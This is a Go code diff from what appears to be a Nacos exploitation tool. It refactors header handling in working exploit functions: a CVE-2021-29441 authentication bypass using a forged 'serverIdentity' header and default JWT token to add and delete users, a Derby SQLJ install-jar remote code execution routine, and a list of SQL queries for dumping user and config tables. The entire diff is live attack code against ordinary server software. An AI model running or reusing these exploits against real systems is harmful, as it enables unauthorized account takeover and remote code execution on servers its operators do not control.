@@ -26,15 +26,16 @@ var sqi = []string{"select * from users", "select * from config_tags_relation", 
 // JWT默认key绕过
 // serverIdentity头绕过 Nacos <= 2.2.0
 func CVE_2021_29441_Step1(url, username, password string, client *http.Client) bool {
-	header := http.Header{}
-	header.Add("User-Agent", "Nacos-Server")
-	header.Add("accessToken", token)
-	header.Add("serverIdentity", "security")
+	header := map[string]string{
+		"User-Agent":     "Nacos-Server",
+		"accessToken":    token,
+		"serverIdentity": "security",
+	}
 	_, body, err := clients.NewRequest("GET", url+cve_2021_29411_validateURI, header, nil, 10, false, client)
 	if err != nil || !(strings.Contains(string(body), "username") && strings.Contains(string(body), "password")) {
 		return false
 	}
-	header.Add("Content-Type", "application/x-www-form-urlencoded")
+	header["Content-Type"] = "application/x-www-form-urlencoded"
 	content := fmt.Sprintf("username=%s&password=%s", username, password)
 	_, body, err = clients.NewRequest("POST", url+cve_2021_29411_userURI, header, strings.NewReader(content), 10, false, client)
 	if err != nil {
@@ -45,10 +46,11 @@ func CVE_2021_29441_Step1(url, username, password string, client *http.Client) b
 
 // 删除用户
 func CVE_2021_29441_Step2(url, username string, client *http.Client) bool {
-	header := http.Header{}
-	header.Add("User-Agent", "Nacos-Server")
-	header.Add("accessToken", token)
-	header.Add("serverIdentity", "security")
+	header := map[string]string{
+		"User-Agent":     "Nacos-Server",
+		"accessToken":    token,
+		"serverIdentity": "security",
+	}
 	_, body, err := clients.NewRequest("DELETE", url+cve_2021_29411_userURI+"?username="+username, header, nil, 10, false, client)
 	if err != nil {
 		return false
@@ -98,12 +100,13 @@ func DerbySqljinstalljarRCE(ctx context.Context, headers, target, command, servi
 			gologger.Debug(ctx, "Failed to write to form file: "+err.Error())
 		}
 		writer.Close()
-		h := http.Header{}
-		h.Set("Content-Type", writer.FormDataContentType())
-		if len(tempHeader) >= 2 {
-			h.Set(tempHeader[0], tempHeader[1])
+		header := map[string]string{
+			"Content-Type": writer.FormDataContentType(),
 		}
-		_, respBody, err := clients.NewRequest("POST", removalURL, h, body, 10, true, client)
+		if len(tempHeader) >= 2 {
+			header[tempHeader[0]] = tempHeader[1]
+		}
+		_, respBody, err := clients.NewRequest("POST", removalURL, header, body, 10, true, client)
 		if err != nil {
 			gologger.Debug(ctx, err)
 		}
